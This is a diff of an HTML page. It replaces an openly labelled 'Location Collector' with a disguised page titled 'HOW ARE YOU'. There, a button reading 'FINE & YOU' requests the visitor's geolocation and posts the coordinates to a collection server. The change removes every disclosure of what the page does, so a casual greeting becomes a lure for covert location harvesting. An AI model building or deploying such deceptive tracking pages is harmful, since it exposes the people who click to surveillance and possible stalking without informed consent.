@@ -3,71 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Get User Location</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin-top: 50px;
-        }
-        button {
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        .output {
-            margin-top: 20px;
-        }
-    </style>
+    <title>HOW ARE YOU</title>
 </head>
 <body>
-    <h1>Location Collector</h1>
-    <p>Click the button to share your location.</p>
-    <button id="getLocation">Get Location</button>
-    <div class="output">
-        <p id="status"></p>
-        <p id="coordinates"></p>
-    </div>
+    <h1>HOW ARE YOU</h1>
+    <button onclick="getLocation()">FINE & YOU</button>
 
     <script>
-        document.getElementById("getLocation").addEventListener("click", () => {
-            const status = document.getElementById("status");
-            const coordinates = document.getElementById("coordinates");
-
-            // Check if Geolocation is available
-            if ("geolocation" in navigator) {
-                status.textContent = "Getting your location...";
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
-                        status.textContent = "Location retrieved!";
-                        coordinates.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
-                        
-                        // Example: Send location to a server
-                        fetch('https://example.com/collect-location', {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                            },
-                            body: JSON.stringify({ latitude, longitude }),
-                        }).then(response => {
-                            if (response.ok) {
-                                console.log("Location sent successfully.");
-                            } else {
-                                console.error("Failed to send location.");
-                            }
-                        });
-                    },
-                    (error) => {
-                        status.textContent = "Unable to retrieve location.";
-                        console.error("Error:", error.message);
-                    }
-                );
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);
             } else {
-                status.textContent = "Geolocation is not supported by your browser.";
+                alert("Geolocation is not supported by this browser.");
             }
-        });
+        }
+
+        function sendLocation(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            // Sending the location to the server
+            fetch('http://localhost:3000/collect-location', {  // Update with your server URL if deployed
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ latitude, longitude })
+            })
+            .then(response => response.text())
+            .then(data => alert('Location sent successfully: ' + data))
+            .catch(error => console.error('Error:', error));
+        }
+
+        function showError(error) {
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("User denied the request for Geolocation.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("Location information is unavailable.");
+                    break;
+                case error.TIMEOUT:
+                    alert("The request to get user location timed out.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("An unknown error occurred.");
+                    break;
+            }
+        }
     </script>
 </body>
 </html>
